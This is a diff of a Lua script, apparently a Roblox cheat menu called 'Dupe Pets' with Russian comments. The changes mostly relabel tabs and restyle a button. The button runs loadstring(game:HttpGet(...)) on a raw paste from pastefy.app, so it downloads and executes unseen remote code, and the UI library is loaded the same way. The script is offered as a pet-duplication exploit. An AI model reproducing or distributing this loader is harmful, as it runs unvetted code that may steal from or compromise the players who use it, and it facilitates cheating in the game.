@@ -1,19 +1,19 @@
--- Загрузка библиотеки Kavo UI
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-
--- Создание главного окна
 local Window = Library.CreateLib("Dupe Pets", "Serpent")
 
--- Вкладка "Main"
-local MainTab = Window:NewTab("Main")
-local PetsSection = MainTab:NewSection("Dupe Pets")
+-- Главная вкладка с кнопкой
+local MainTab = Window:NewTab("Dupe Menu")
+local DupeSection = MainTab:NewSection("")
 
--- Кнопка для дублирования питомцев
-PetsSection:NewButton("all pets", function()
-    -- Запуск вашего скрипта при нажатии
+-- Создаем кнопку с редактируемым текстом
+local DupeButton = DupeSection:NewButton("Write pet name here", "", function()
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
+-- Настройка внешнего вида кнопки
+DupeButton.Instance.TextSize = 14
+DupeButton.Instance.Size = UDim2.new(0, 200, 0, 30)
+
 -- Вкладка с автором
-local CreditsTab = Window:NewTab("Credits")
-CreditsTab:NewSection("Made By Mangekoy2 | v2.0")
+local CreditsTab = Window:NewTab("Info")
+CreditsTab:NewSection("Made by Mangekoy | v2")
